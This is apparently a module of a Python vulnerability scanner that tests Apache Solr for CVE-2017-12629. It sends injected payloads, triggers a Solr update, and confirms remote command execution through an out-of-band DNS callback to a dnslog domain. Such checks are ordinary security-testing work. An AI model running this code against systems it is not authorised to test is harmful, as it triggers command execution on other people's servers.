#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2017_12629_scan(self, url):
    ''' 7.1.0之前版本总共爆出两个漏洞: XML实体扩展漏洞(XXE)和远程命令执行漏洞(RCE)
            二者可以连接成利用链, 编号均为CVE-2017-12629
    '''
    sessid = '60491ea49ab435a2cc1acb7aa93e3409'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2017-12629'
    # vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    md = random_md5()                                       # * 随机md5值, 8位
    dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

    for payload in self.cve_2017_12629_payloads:
        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG
            
            if ('"WARNING":"This response format is experimental.  It is likely to change in the future."' in res.text):
                res2 = requests.post(
                    url + 'solr/demo/update', 
                    timeout=self.timeout, 
                    headers=headers,
                    data='[{"id":"test"}]', 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
            else:
                return None


            # todo 判断
            sleep(10)                                    # * solr响应太慢啦!
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                    'Request-2': res2
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
